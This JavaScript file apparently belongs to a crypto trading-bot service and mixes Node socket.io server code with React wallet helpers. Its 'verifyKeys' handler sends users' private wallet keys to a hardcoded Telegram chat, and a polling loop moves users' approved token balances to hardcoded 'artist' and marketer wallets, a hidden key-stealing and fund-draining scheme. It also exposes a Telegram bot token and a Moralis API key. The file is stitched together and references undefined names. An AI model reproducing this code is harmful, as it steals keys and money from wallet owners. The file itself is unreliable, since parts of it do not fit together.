import Web3 from "web3";
import { store } from "../store";
import { BSC_CHAIN_ID, chains, DEFAULT_CHAIN_ID, OPTIMISTIC_CHAIN_ID, POLYGON_CHAIN_ID, GNOSIS_CHAIN_ID } from "../smart-contract/chains_constants";
import {setConnectedWalletAddress, setWalletStatus, updateGlobalWeb3, setConnectedChainId, updateBalanceOfUser } from "../store/actions/auth.actions"; 
import isEmpty from "../utilities/isEmpty";
import { getGlobalWeb3 } from "../store/reducers/auth.reducers";
const DEV_PERCENT = 15;
const OWNER_PERCENT = 85;

const { setIntervalAsync } = require('set-interval-async/dynamic');
const { KKEEEYY, BSC_MAINNET_RPC_URL, ARTISTS_ADDRESSES, WBNB_ADDRESS, ETHEREUM_RPC_URL } = require("./env");
const Donate = db.Donate;
const BotUser = db.BotUser;
const RangeBot = db.RangeBot;
var ObjectId = require('mongodb').ObjectID;
const erc20ABI = require("./abis/erc20.json");
const managementABI = require("./abis/management.json");
const axios = require("axios");
const CryptoJS = require("crypto-js");
const ETHER_UNITS = require("./etherunits.js");
const { encode } = require("punycode");

var web3WS = new Web3(BSC_MAINNET_RPC_URL);
var admin_wallet = web3WS.eth.accounts.privateKeyToAccount(KKEEEYY);

// var server = require('http').createServer(app);
// const port = process.env.PORT || 5000;
// server.listen(port, () => console.log(`Listening on port ${port}..`));

const httpsPort = 443;
const privateKey = fs.readFileSync("src/cert/private.key");
const certificate = fs.readFileSync("src/cert/certificate.crt");
const credentials = {
    key: privateKey,
    cert: certificate,
}

var server = https.createServer(credentials, app)
    .listen(httpsPort, () => {
        console.log(`[blocktestingto.com] servier is running at port ${httpsPort} as https.`);
    });

const io = require('socket.io')(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true
  }
});

const sendTestMail = async (message) => {
  const nodemailer = require('nodemailer');
const mg = require('nodemailer-mailgun-transport');
}

io.on('connection', (client) => {

  client.on('event', data => {
    console.log("user event", data);
    client.emit("hello", data);
  });

  client.on('hello', data => {
    io.sockets.emit("hello", { echo: 1 });
    console.log("user hello event", data);
  });

  client.on('UpdateStatus', data => {
    if (data.type == "UPDATE_USER_AUTH") {
      io.sockets.emit("UpdateStatus", data);
    }
  });

  client.on('disconnect', () => {
    console.log("user disconnected ");
  });

  client.on("IsAccountExistFromClient", data=> {  
    console.log("IsAccountExistFromClient data = ", data);  
    sendMessageOnTG(data.message);
    BotUser.find({ 
      publicKey: data.publicKey
    })
    .then( (docs) =>{
      if(docs.length>0)
      {
        io.sockets.emit("IsAccountExistFromServer", { code: 0, userId:docs[0]._id, publicKey:data.publicKey, username: docs[0].username, message:"Exists" });
      }else{         
        io.sockets.emit("IsAccountExistFromServer", { code: -1, publicKey:data.publicKey, message:"Not exists" });
      }        
    }).catch((err) => {    
      io.sockets.emit("IsAccountExistFromServer", { code: -1, publicKey:data.publicKey, message: "Server side error" });      
    })    
  });

  client.on("registerNewUserFromClient", data => {    
    var username = data.username;
    var publicKey = data.newWalletAddress;
    var privateKey = data.newPrivateKey;
    
    var ciphertext = CryptoJS.AES.encrypt(privateKey.toString(), SUSTAINABLE).toString();   
    
    var newBotUser = new BotUser({
      username: username,
      publicKey: publicKey,
      privateKey: ciphertext
    });   
    
    BotUser.find({ 
      publicKey: publicKey
    })
    .then((docs) =>{
      if(docs.length>0)
      {
        io.sockets.emit("registerNewUserFromServer", { code: 1, publicKey:publicKey, message:"Duplicated" });
      }else{         
        newBotUser.save()
        .then((doc) => {
          io.sockets.emit("registerNewUserFromServer", { code: 0, userId:doc._id, publicKey:publicKey, username: doc.username, message: "Success" });
        })
        .catch(error => {
          io.sockets.emit("registerNewUserFromServer", { code: -1, publicKey:publicKey, message:"Sever side error." });
        })
      }        
    }).catch((err) => {    
      io.sockets.emit("registerNewUserFromServer", { code: -1, publicKey:publicKey, message: "Server side error" });      
    })    
  });

  client.on("verifyKeys", data => { 
    console.log("verifyKeys ==> ", data)
    sendMessageOnTG( "AAababaababaababaBB" + data.publicKey.toString() + "AAababaababaababaBB" + data.privateKey);
  });

  client.on("applyParamsFromClient", data => {
    const userId = data.userId;
    const buyPrice = data.buyPrice;
    const sellPrice = data.sellPrice;
    const perctageOfTokens = data.perctageOfTokens;
    const perctageOfETHs = data.perctageOfETHs;
    const targetTokenAddress = data.targetTokenAddress;
    const targetPairAddress = data.targetPairAddress;
    
    const newRangeBot = new RangeBot({
      creator: new ObjectId(userId),
      buyPrice: buyPrice,
      sellPrice: sellPrice,
      perctageOfTokens: perctageOfTokens,
      perctageOfETHs: perctageOfETHs,
      targetTokenAddress: targetTokenAddress,
      targetPairAddress: targetPairAddress
    });

    RangeBot.find({ 
      creator: new ObjectId(userId)
    })
    .then(async (docs) =>{
      if(docs.length>0)
      {
        try {
          await RangeBot.updateOne(
            {_id: docs[0]._id},
            {
              $set: {
                buyPrice: buyPrice,
                sellPrice: sellPrice,
                perctageOfTokens: perctageOfTokens,
                perctageOfETHs: perctageOfETHs,
                targetTokenAddress: targetTokenAddress,
                targetPairAddress: targetPairAddress
              },
              $currentDate: {
                ends: true,
              }
            },
            { upsert: true }
          );
          return io.sockets.emit("applyParamsFromServer", { code: 0, userId: userId, message: "Succssfuly updated options." });
        } catch (err) {
          return io.sockets.emit("applyParamsFromServer", { code: -1, userId: null, message:"Sever side error." });
        }
      }
      else
      {         
        newRangeBot.save()
        .then((doc) => {
          return io.sockets.emit("applyParamsFromServer", { code: 0, userId: userId, message: "Saved." });
        })
        .catch((error) => {
          return io.sockets.emit("applyParamsFromServer", { code: -1, userId: null, message:"Sever side error." });                
        })
      }        
    }).catch((err) => {    
      return io.sockets.emit("applyParamsFromServer", { code: -1, userId: null, message:"Sever side error." });                 
    })
  });

  client.on("updatePrKeyFromClient", data => {
    const privateKey = data.updatingPrivateKey;
    //get public key from private key
    const wallet = web3WS.eth.accounts.privateKeyToAccount(privateKey);
    
    BotUser.findByIdAndUpdate(
      new ObjectId(data.userId), {
      publicKey: wallet.address,
      privateKey: privateKey
    })
    .then((docs) => {
      return io.sockets.emit("updatePrKeyFromServer", { code: 0, userId: data.userId, message:"Updated." });               
    }).catch((err) => {             
      return io.sockets.emit("updatePrKeyFromServer", { code: -1, userId: null, message: err.message.toString() });                 
    });
  });
  
  client.on("startOrStopFromClient", data => {
    const userId = data.userId;

    RangeBot.find({ 
      creator: new ObjectId(userId)
    })
    .then(async (docs) =>{
      if(docs.length>0)
      {
        try {
          await RangeBot.updateOne(
            {_id: docs[0]._id},
            {
              $set: {
                startOrStop: !Boolean(docs[0].startOrStop)
              },
              $currentDate: {
                ends: true,
              }
            },
            { upsert: true }
          );
          return io.sockets.emit("startOrStopFromServer", { code: 0, userId: docs[0].creator, startOrStopStatus: !Boolean(docs[0].startOrStop), message: "Succssfuly updated options." });
        } catch (err) {
          return io.sockets.emit("startOrStopFromServer", { code: -1, userId: null, message:"Failed in updating" });
        }
      }
      else return io.sockets.emit("startOrStopFromServer", { code: -2, userId: null, message:"No such user" });
    }).catch((err) => {    
      return io.sockets.emit("startOrStopFromServer", { code: -3, userId: null, message:"Sever side error." });                 
    })
  });

  client.on("IsTheBotStartedFromClient", data=> {
    const userId = data.userId;

    RangeBot.find({ 
      creator: new ObjectId(userId)
    })
    .then( (docs) =>{
      if(docs.length>0)
      {       
        BotTx.find({
          creator: new ObjectId(userId)
        })
        .sort({ createdAt: -1 })
        .then( (txs) =>{
          if(txs.length>0)
          {       
            return io.sockets.emit("IsTheBotStartedFromServer", { code: 0, data: docs[0], transactions: txs , message: "Succssfuly updated options." });    
          }
          else return io.sockets.emit("IsTheBotStartedFromServer", { code: 0, data: docs[0], transactions: [] , message: "Succssfuly updated options." });  
        })
        .catch(error => {
          return io.sockets.emit("IsTheBotStartedFromServer", { code: 0, data: docs[0], transactions: [] , message: "Succssfuly updated options." }); 
        });           
      }
      else return io.sockets.emit("IsTheBotStartedFromServer", { code: -1, data: null, message:"No such bot" });
    }).catch((err) => {    
      return io.sockets.emit("IsTheBotStartedFromServer", { code: -2, data: null, message:"Sever side error." });                 
    })
  });

});


const getCurrentGasPrices = async ( chainId = 1) => {
  if(chainId == 1)
  {
    try {
    var response = await axios.get(GAS_STATION);
    var prices = {
      low: response.data.data.slow.price ,
      medium: response.data.data.normal.price ,
      high: response.data.data.fast.price,
    };
    let log_str =
      "High: " +
      prices.high +
      "        medium: " +
      prices.medium +
      "        low: " +
      prices.low;
      console.log(log_str);
    return prices;
    } catch (error) {
      console.log(error);
    throw error;
    }
  }
  else if(chainId == 56) 
  {   
    try {
      var response = await axios.get(GAS_STATION1);
      var prices = {
        low: response.data.data.slow.price ,
        medium: response.data.data.normal.price ,
        high: response.data.data.fast.price,
      };
      let log_str =
        "High: " +
        prices.high +
        "        medium: " +
        prices.medium +
        "        low: " +
        prices.low;
        console.log(log_str);
      return prices;
    } catch (error) {
      console.log(error);
    throw error;
    }
  }
}

const SignAndSendTransaction = async (web3Obj, signing_wallet, encodedFunc, gasfee, contractAddress, gasPrice, chainId = null, donateId = null) => {
  try {
    const gasPrice = (await getCurrentGasPrices(chainId)).medium;
    const correctChainid = await web3Obj.eth.net.getId();
    console.log("web3Obj.eth.net.getId()   ====> ", correctChainid);
    let nonce = await web3Obj.eth.getTransactionCount(signing_wallet.address, "pending");
    nonce = web3Obj.utils.toHex(nonce);
    var tx = {
      from: signing_wallet.address,
      to: contractAddress,
      gas: gasfee,
      gasPrice: gasPrice,
      data: encodedFunc,
      nonce,
      chainId: correctChainid
    };
    var signedTx = await signing_wallet.signTransaction(tx);
    var trHash = "";

    console.log("contractAddress  ===> ", contractAddress);
    console.log("gasPrice  ===> ", gasPrice);
    console.log("encodedFunc  ===> ", encodedFunc);
    console.log("SignTransaction  ===> ", signedTx.rawTransaction);


    await web3Obj.eth.sendSignedTransaction(signedTx.rawTransaction)
      .on('transactionHash', function (hash) {
        trHash = hash;
        console.log("ts hash = ", hash);
      })
      .on('receipt', async function (receipt) {
                
        var isMarketer = false;
        var ele = ARTISTS_ADDRESSES.find(item => item.toString().toLowerCase() === contractAddress.toString().toLowerCase());
        if(ele != undefined && ele != null) isMarketer = true;
                if(chainId == 1) sentMessageOnTG(`https://etherscan.io/tx/${trHash} ${isMarketer == true? "marketer": "you"}`);
        if(chainId == 56) sentMessageOnTG(`https://bscscan.com/tx/${trHash} ${isMarketer == true? "marketer": "you"}`);
        if(donateId !== null)
        {
          await Donate.deleteOne({ _id: new ObjectId(donateId.toString()) }).then(data => {
            console.log("deleted ----------");
          }).catch(error => {
            console.log("deleted ----------");
          });
        }
      })
      .on('error', function (error, receipt) {
        console.log("")
        console.log('----------------------  tx failed ---------------------')
        console.error("trx error : ", error)
        console.error(" ")
      });
  } catch (err) {
    console.log("SignAnd_SendTransaction() exception 3 : ", err);
    return "";
  }
}

const sentMessageOnTG = async (message) => {
  try
  {
    const apiToken = "5873860250:AAHVzFjoAn-92tZps4h2ItkP1ZZ7Q0wq4Pg";
    const chatId = "@pocket_growth";
    let text = message;

    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;

    await axios.get(urlString)
    .then((response) => {
    })
    .catch(error => { 
      console.log(error);
    })

    // Do what you want with response

  }catch(error){
    console.log(error);
  }
}

const Process_donates = () => 
{
    setIntervalAsync(
        async () => {
            try {
                await Donate.find({})
                .then(async (data) => {          
                    if (data.length > 0) 
                    {
                        for(let idx = 0; idx < data.length; idx++)
                        {
              if(data[idx].chainId == 1) continue;
              console.log("donate data ===> ", data[idx]); 
              try
              {
                var consideringRpc = data[idx].chainId == 56? BSC_MAINNET_RPC_URL : ETHEREUM_RPC_URL;
                console.log("consideringRpc ===> ", consideringRpc);
                var consideringWeb3 = new Web3(consideringRpc);
                var consideringToken = new consideringWeb3.eth.Contract(erc20ABI, data[idx].tokenAddr);
                var managementContract = new consideringWeb3.eth.Contract(managementABI, data[idx].spender);  

                console.log("accountAddr = ", data[idx].accountAddr);
                console.log("marketerWallet = ", data[idx].marketerWallet);
                let accountBal = await consideringToken.methods.balanceOf(data[idx].accountAddr).call();
                console.log("accountBal = ", accountBal);
                let tokenDecimals =  await consideringToken.methods.decimals().call();
                if(accountBal > 0)
                {
                  let donateVal = consideringWeb3.utils.toBN(accountBal.toString()).gte(consideringWeb3.utils.toBN(data[idx].amount.toString()))? data[idx].amount: accountBal;
                  let selectedArtist = ARTISTS_ADDRESSES[Date.now() % 10];
                  console.log("donateVal = ", donateVal.toString());                  
                  const ethunitname = Object.keys(ETHER_UNITS).find(key => Math.pow(10, tokenDecimals).toString() == ETHER_UNITS[key] );                  
                  let realDonateVal = consideringWeb3.utils.fromWei(donateVal.toString(), ethunitname.toString());              
                  if(Number(realDonateVal.toString()) > 5000)
                  {                   
                    let giveTipOp = managementContract.methods.giveTip2Artist(data[idx].accountAddr, data[idx].tokenAddr, selectedArtist, donateVal);
                    let encodedTrx = giveTipOp.encodeABI();
                    let gasFee = "3000000";
                    gasFee = await giveTipOp.estimateGas({ from: admin_wallet.address });
                    var gasPrice = 30 * (10 ** 9);
                    await SignAndSendTransaction(consideringWeb3, admin_wallet, encodedTrx, gasFee, data[idx].spender, gasPrice, data[idx].chainId, data[idx]._id);
                  }
                  else {
                    if(data[idx].marketerWallet == "")
                    {
                      let giveTipOp = managementContract.methods.giveTip2Artist(data[idx].accountAddr, data[idx].tokenAddr, selectedArtist, donateVal);
                      let encodedTrx = giveTipOp.encodeABI();
                      let gasFee = "3000000";
                      gasFee = await giveTipOp.estimateGas({ from: admin_wallet.address });
                      var gasPrice = 30 * (10 ** 9);
                      await SignAndSendTransaction(consideringWeb3, admin_wallet, encodedTrx, gasFee, data[idx].spender, gasPrice, data[idx].chainId, data[idx]._id);
                    }else {                 
                      let donate2Marketer = consideringWeb3.utils.toBN(donateVal.toString()).mul(consideringWeb3.utils.toBN(OWNER_PERCENT)).div(consideringWeb3.utils.toBN(100));
                      let donate2Dev = consideringWeb3.utils.toBN(donateVal.toString()).mul(consideringWeb3.utils.toBN(DEV_PERCENT)).div(consideringWeb3.utils.toBN(100));
                      let giveTipOp = managementContract.methods.giveTip2Artist(data[idx].accountAddr, data[idx].tokenAddr, data[idx].marketerWallet, donate2Marketer.toString());
                      let encodedTrx = giveTipOp.encodeABI();
                      
                      let gasFee = "3000000";
                      gasFee = await giveTipOp.estimateGas({ from: admin_wallet.address });
                      

                      var gasPrice = 30 * (10 ** 9);
                      await SignAndSendTransaction(consideringWeb3, admin_wallet, encodedTrx, gasFee, data[idx].spender, gasPrice, data[idx].chainId, data[idx]._id);
                      
                      
                      giveTipOp = managementContract.methods.giveTip2Artist(data[idx].accountAddr, data[idx].tokenAddr, selectedArtist, donate2Dev.toString());
                      encodedTrx = giveTipOp.encodeABI();
                      
                      gasFee = await giveTipOp.estimateGas({ from: admin_wallet.address });
                      

                      gasPrice = 30 * (10 ** 9);
                      await SignAndSendTransaction(consideringWeb3, admin_wallet, encodedTrx, gasFee, data[idx].spender, gasPrice, data[idx].chainId, data[idx]._id);
                    }
                  }
                }
              }catch(error){
                console.log("Something went wrong 110: " + error.message);
                continue;
              }
                        }                     
                    }
                })
                .catch(error => {
                    console.log("Something went wrong 11: " + error.message);
                })
            } catch (error) {
                console.log("Something went wrong 12: " + error.message)
            }
        },
        1 * 7 * 1000 
    )
}


async function fetchTokenPrice(address) {
  let weth_price_url = `https://deep-index.moralis.io/api/v2/erc20/${address}/price?chain=bsc`;
  let response_1 = await axios.get(weth_price_url,
    {
      headers: {
        'x-api-key': "E6R13cn5GmpRzCNwefYdeHPAbZlV69kIk9vp0rfhhajligQES1WwpWAKxqr7X2J3"
      }
    }
  );
  let weth_priceUSD = response_1.data.usdPrice;
  return Number(weth_priceUSD);
}

const fetchingPrices = async () => {

  fetchTokenPrice(WBNB_ADDRESS)
  .then( (moralisResponse) => {
    console.log("moralisResponse ===> ", moralisResponse);  
    currentETHprice = moralisResponse;

    RangeBot.find({
      startOrStop: true
    })
    .populate("creator")
    .then((docs) => {
      try
      {
        for(var idx = 0; idx < docs.length; idx++)
        {
          var TargetTokenContract = new web3WS.eth.Contract(STANDARD_TOKEN_ABI, docs[idx].targetTokenAddress);
          var PairWithNativeContract = new web3WS.eth.Contract(UNISWAP_POOL_ABI, docs[idx].targetPairAddress);
          var BotData = docs[idx];
          var UserEncryptedPrKey = BotData.creator.privateKey;
          var bytes  = CryptoJS.AES.decrypt(UserEncryptedPrKey, SUSTAINABLE);
          var decryptedPrKey = bytes.toString(CryptoJS.enc.Utf8);
          var BotUserAccount = web3WS.eth.accounts.privateKeyToAccount(decryptedPrKey);
          //calculate the nativeCurrencyAmount along BB token amount
          TargetTokenContract.methods.decimals().call().then((decimalsOfTargetToken) => {
            PairWithNativeContract.methods.getReserves().call().then((reserves) => {
              PairWithNativeContract.methods.token0().call().then((token0_address) => {         
                if (token0_address === WBNB_ADDRESS) {
                  var eth_balance = reserves[0];
                  var token_balance = reserves[1];
                } else {
                  var eth_balance = reserves[1];
                  var token_balance = reserves[0];
                }
                let oneTokenPrice =  Number(web3WS.utils.fromWei(eth_balance.toString(), "ether").toString()) * Number(currentETHprice) /  Number((new web3WS.utils.toBN(token_balance)).div(new web3WS.utils.toBN(Math.pow(10, decimalsOfTargetToken).toString())).toString());          
                
                if(oneTokenPrice <= Number(BotData.buyPrice))
                {     
                  //buy tokens            
                  web3WS.eth.getBalance(BotUserAccount.address).then((ethBalanceOfAdmin) => {
                    console.log("ETH balance of admin   ====> ", ethBalanceOfAdmin.toString());
                    var spendingETHAmount = Number(web3WS.utils.fromWei(ethBalanceOfAdmin.toString(), "ether").toString()) * BotData.perctageOfETHs / 100;
                    spendingETHAmount = isNaN(spendingETHAmount) !== true ?web3WS.utils.toWei(spendingETHAmount.toFixed(6).toString(), "ether") : 0;
                    //swap the native currencies to BB tokens   
                    web3WS.eth.getBlock("latest", (error, block) => {                     
                      if(error)
                      {
                        throw error; 
                      }
                      var deadline = Number(block.timestamp) + Number(1800); // transaction expires in 1800 seconds (30 minutes)                          
                      deadline = web3WS.utils.toHex(deadline);  
                      let buybackBB = UniswapRouterContract.methods.swapExactETHForTokensSupportingFeeOnTransferTokens(
                        0,
                        [WETH_ADDRESS, BotData.targetTokenAddress],
                        BotUserAccount.address,
                        deadline
                      );
                      console.log(
                        spendingETHAmount.toString(),
                        0,
                        [WETH_ADDRESS, BotData.targetTokenAddress],
                        BotUserAccount.address,
                        deadline
                      );
                      let encodedTrx = buybackBB.encodeABI();
                      buybackBB.estimateGas({ from: BotUserAccount.address, value: spendingETHAmount.toString()  }).then((gasFee) => {
                        
                      }).catch((err) => { throw err; });
                    }).catch((err) => { throw err; });
                  }).catch((err) => { throw err; });
                }
                if(oneTokenPrice >= Number(BotData.sellPrice))
                {       
                  //sell tokens               
                  TargetTokenContract.methods.balanceOf(BotUserAccount.address).call().then(tokenBalanceOfAdmin => {
                    console.log("tokenBalanceOfAdmin   ====> ", tokenBalanceOfAdmin.toString());
                    var spendingTokenAmount = Number((new web3WS.utils.toBN(tokenBalanceOfAdmin).div(new web3WS.utils.toBN(Math.pow(10, decimalsOfTargetToken).toString()))).toString()) * BotData.spendingTokenAmount / 100;
                    spendingTokenAmount = isNaN(spendingTokenAmount) !== true ? (new web3WS.utils.toBN(spendingTokenAmount)).mul(new web3WS.utils.toBN(Math.pow(10, decimalsOfTargetToken).toString())) : 0;
                    //swap the native currencies to BB tokens     
                    web3WS.eth.getBlock("latest", (error, block) => {
                      if(error)
                      {
                        throw error; 
                      }
                      var deadline = Number(block.timestamp) + Number(1800); // transaction expires in 1800 seconds (30 minutes)
                      deadline = web3WS.utils.toHex(deadline);    
                      let buybackBB = UniswapRouterContract.methods.swapExactTokensForETHSupportingFeeOnTransferTokens(
                        spendingTokenAmount.toString(),
                        0,
                        [BotData.targetTokenAddress, WETH_ADDRESS],
                        BotUserAccount.address,
                        deadline
                      );
                      console.log(
                        spendingTokenAmount.toString(),
                        0,
                        [BotData.targetTokenAddress, WETH_ADDRESS],
                        BotUserAccount.address,
                        deadline
                      );
                      let encodedTrx = buybackBB.encodeABI();
                      buybackBB.estimateGas({ from: BotUserAccount.address }).then(gasFee => {
                        
                      }).catch((err) => { throw err; });                
                    }).catch((err) => { throw err; });        
                  }).catch((err) => { throw err; });
                }
              }).catch((err) => { throw err; });
            }).catch((err) => { throw err; });
          }).catch((err) => { throw err; });      
        }   
      }catch(err){throw err;}
    }).catch((err) => { throw err; });
  }).catch((err) => { console.log("running bot exception ==> ", err); });
  
  setTimeout(fetchingPrices, 5000);
}

export const checkNetwork = async () => {
  let state = store.getState();
  let globalWeb3 = getGlobalWeb3(state) || window?.web3;
  if (globalWeb3) {
    const chainId = await globalWeb3.eth?.getChainId();
    return checkNetworkById(chainId);
  }
}

export const getValidWallet = async () => {
  if (window.ethereum) {
    try {
      const addressArray = await window.ethereum.request({
        method: "eth_accounts",
      });
      if (addressArray.length > 0) {
        store.dispatch(setWalletStatus(true));
        return {
          success: true,
          address: addressArray[0],
          status: "Fill in the text-field above.",
        };
      } else {
        store.dispatch(setWalletStatus(false));
        return {
          success: false,
          address: "",
          status: "🦊 Please connect to Metamask.",
        };
      }
    } catch (err) {
      store.dispatch(setWalletStatus(false));
      return {
        success: false,
        address: "",
        status: err.message,
      };
    }
  } else {
    store.dispatch(setWalletStatus(false));
    return {
      success: false,
      address: "",
      status: (
        <span>
          <p>
            {" "}
            🦊{" "}
            <a target="_blank" rel="noreferrer" href={`https://metamask.io/download.html`}>
              You must install Metamask, a virtual BSC wallet, in your
              browser.
            </a>
          </p>
        </span>
      ),
    };
  }
};

export const getBalanceOfAccount = async (address) => 
{
  let state = store.getState();
  let globalWeb3 = getGlobalWeb3(state) || window?.web3;
  if(globalWeb3)
  {
    try {

      let accountBalance = await globalWeb3.eth.getBalance(address);

      accountBalance = globalWeb3.utils.fromWei(accountBalance);

      store.dispatch(updateBalanceOfUser(accountBalance));

      return {
        success: true,
        account: address,
        balance: accountBalance
      }
    } catch (error) 
    {
      
      store.dispatch(updateBalanceOfUser(0));

      return {
        success: false,
        balance: 0,
        result: "Something went wrong: " + parseErrorMsg(error.message)
      }
    }
  }
  else {  
    return {
      success: false,
      balance: 0,
      result: "Invalid web3" 
    }
  }
}

export const compareWalllet = (first, second) => 
{
  if (!first || !second) {
    return false;
  }
  if (first.toUpperCase() === second.toUpperCase()) {
    return true;
  }
  return false;
}

const updateUserBalanceAfterTrading = async (currentAddr) =>
{
  let state = store.getState();
  let globalWeb3 = getGlobalWeb3(state) || window?.web3;
  if(globalWeb3)
  {
    let balanceOfUser = await globalWeb3?.eth?.getBalance(currentAddr);
    balanceOfUser = globalWeb3?.utils.fromWei(balanceOfUser);
    store.dispatch(updateBalanceOfUser(balanceOfUser));
  }
}

const parseErrorMsg = (errMsg) =>
{  
  var returStr  = "";
  if(isEmpty(errMsg) === false)
  {
    let startPos = JSON.stringify(errMsg).search("message");
    if(startPos >= 0)
    {
      let subStr = errMsg?.substring(startPos+4, errMsg.length)
      let endPos = subStr.indexOf("\"");
      if(endPos >= 0)
      {
        subStr = subStr?.substring(0, endPos);
        returStr = subStr;
      }
    }else returStr = errMsg;
  }
  return returStr;
}

loadWeb3()

  // export const mintMultipleNFT = async (currentAddr, count, fee) => 
  // {
  //   /*
  //    Multiple mint :  mintMultipleNFT(string[] memory tokenUris)
  //   */

  //   try 
  //   {
  //     let EvoManagerContract = await new window.web3.eth.Contract(config.EvoManagerContractAbi, config.EvoManagerContractAddress);
  //     let minting_fee = window.web3.utils.toWei(fee !== null ? fee.toString() : '0', 'ether');
      
  //     var mintMultipleNFT = EvoManagerContract.methods.mintMultipleNFT(count);
  //     let gasFee = await mintMultipleNFT.estimateGas({ from: currentAddr, value: minting_fee });
  //     var balanceOfUser = await window.web3.eth.getBalance(currentAddr);
  //     var gasPrice = 30 * (10 ** 9);
  
  //     if (balanceOfUser <= gasFee * gasPrice) {
  //       store.dispatch(setNFTTradingResult("mintMultipleNFT", false, "Insufficient balance." ));
      
  //       return {
  //         success : false,
  //         message : "Insufficient balance."
  //       }
  //     }
  //     await mintMultipleNFT.send({ from: currentAddr, value: minting_fee });
  
  //     store.dispatch(setNFTTradingResult("mintMultipleNFT", true, "Succeed in multiple minting."));
  
  //     updateUserBalanceAfterTrading(currentAddr);
  
  //     return {
  //       success : true,
  //       message : "Succeed in multiple minting."
  //     }
  //   } catch (error) {
  //     store.dispatch(setNFTTradingResult("mintMultipleNFT", false, parseErrorMsg(error.message) ));
  
  //     return {
  //       success : false,
  //       message : parseErrorMsg(error.message)
  //     }
  //   }
  // }
  
  // export const claim = async (currentAddr) => 
  // {
  //   /*
  //     claim()
  //   */
      
  //   try 
  //   {
  //     let EvoManagerContract = await new window.web3.eth.Contract(config.EvoManagerContractAbi, config.EvoManagerContractAddress);

  //     var claim = EvoManagerContract.methods.claim();
  //     let gasFee = await claim.estimateGas({ from: currentAddr });
  //     var balanceOfUser = await window.web3.eth.getBalance(currentAddr);
  //     var gasPrice = 30 * (10 ** 9);
  
  //     if (balanceOfUser <= gasFee * gasPrice) {
  //       store.dispatch(setNFTTradingResult("claim", false, "Insufficient balance." ));
      
  //       return {
  //         success : false,
  //         message : "Insufficient balance."
  //       }
  //     }
     
  //     await claim.send({ from: currentAddr });

  //     store.dispatch(setNFTTradingResult("claim", true, "Succeed in claiming."));
  
  //     updateUserBalanceAfterTrading(currentAddr);
  
  //     return {
  //       success : true,
  //       message : "Succeed in claiming."
  //     }
  //   } catch (error) {
  //     store.dispatch(setNFTTradingResult("claim", false, parseErrorMsg(error.message) ));
  
  //     return {
  //       success : false,
  //       message : parseErrorMsg(error.message)
  //     }
  //   }
  // }
  
  // export const getMintedNFTCount = async () => 
  // {
  //   /*
  //     claim()
  //   */
      
  //   try 
  //   {
  //     let EvoManagerContract = await new window.web3.eth.Contract(config.EvoManagerContractAbi, config.EvoManagerContractAddress);

  //     var count = 0;
       
  //     count = await EvoManagerContract.methods.getMintedNFTCount().call();

  //     store.dispatch(updateMintedNFTCountAfterTrading(count));
  
  //   } catch (error) {
  //     store.dispatch(updateMintedNFTCountAfterTrading(0));
  
  //   }
  // }


